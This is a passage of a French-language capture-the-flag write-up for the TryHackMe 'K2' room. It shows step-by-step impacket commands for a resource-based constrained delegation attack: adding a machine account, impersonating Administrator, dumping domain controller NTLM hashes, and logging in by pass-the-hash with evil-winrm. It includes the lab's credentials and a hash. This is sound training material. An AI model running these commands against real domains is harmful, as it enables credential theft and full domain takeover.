![o.arnstrong IT DIRECTOR MEMBERSHIP](/images/THM-K2/IT_Director_membership.png)

![IT DIRECTOR GenericWrite permission](/images/THM-K2/GenericWrite_Perm.png)

> La **délégation restreinte basée sur les ressources (RBDC)**, également connue sous le nom de **délégation Kerberos contrainte basée sur les ressources**, est un mécanisme de sécurité mis en place dans Active Directory pour contrôler finement les autorisations d'accès aux ressources réseau. Elle permet de déléguer des droits d'accès spécifiques à des comptes d'utilisateurs ou de services, en limitant ces droits à des ressources bien définies. _Pour en savoir plus, cliquez [ici](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)_.


1. Créer un compte d'ordinateur dans le domaine

```
impacket-addcomputer -computer-name 'KSCORPIO$' -computer-pass 'LETSgetr00t!' -dc-host K2RootDC.k2.thm -domain-netbios k2.thm k2.thm/o.armstrong:'arMStronG08'
```

![RBCD step 1](/images/THM-K2/RBCD1.png)


2. Modifier l'attribut `msDS-AllowedToActOnBehalfOtherIdentity` sur le contrôleur de domaine pour inclure notre objet ordinateur nouvellement créé afin d'autoriser l'usurpation d'identité.

```
impacket-rbcd -delegate-from 'KSCORPIO$' -delegate-to 'K2RootDC$' -dc-ip 10.10.124.173 -action 'write' 'k2.thm/o.armstrong:arMStronG08'
```

![RBCD step 2](/images/THM-K2/RBCD2.png)


3. Obtenir un ticket Kerberos en se faisant passer pour **Administrator**.

```
impacket-getST -spn 'cifs/K2RootDC.k2.thm' -impersonate Administrator -dc-ip 10.10.124.173 k2.thm/KSCORPIO$:'LETSgetr00t!'
```

![RBCD step 3](/images/THM-K2/RBCD3.png)

4. Pour qu'Impacket utilise notre ticket, il faut définir une variable d'environnement avec le nom de notre fichier de cache.

```
export KRB5CCNAME=Administrator@cifs_K2RootDC.k2.thm@K2.THM.ccache
```

5. Extraire les hashs NTLM du DC.

```
impacket-secretsdump 'k2.thm/Administrator@K2RootDC.k2.thm' -k -no-pass -dc-ip 10.10.124.173 -target-ip 10.10.124.173 -just-dc-ntlm
```

![RBCD step 4](/images/THM-K2/RBCD4.png)

Avec le hash de l'administrateur, nous pouvons nous connecter via evil-winrm et lire le drapeau root.

```
evil-winrm -i k2.thm -u Administrator -H "15ecc755a43d2e7c8001215609d94b90"
```

![K2 -Summit root flag](/images/THM-K2/root_flag_K2S.png)


Merci d'avoir pris le temps de lire ce **long** article! Je vous laisse ci-dessous quelques références qui m'ont été utiles pour cette room.

## Références

* [Tib3rius SQLi cheatsheet](https://tib3rius.com/sqli.html)

* TryHackMe propose trois **salles gratuites** qui vous donneront une bonne base pour SQLi:
	- [SQL Injection](https://tryhackme.com/r/room/sqlinjectionlm)
	- [Advanced SQL Injection](https://tryhackme.com/r/room/advancedsqlinjection)
	- [SQL Injection Lab](https://tryhackme.com/r/room/sqlilab)

* Installer Bloodhound avec Docker Compose (configuration plus simple) disponible [ici](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose#h_01H9MMVW3J42013Q0P68WSRK2R).

* Comment abuser de l'appartenance au groupe `Backup Operators` -> [ici](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators).

* Apprendre ce qu'est le CIFS (utilisé à l'étape 3 de la RBCD) -> [What is CIFS?](https://www.upguard.com/blog/cifs)
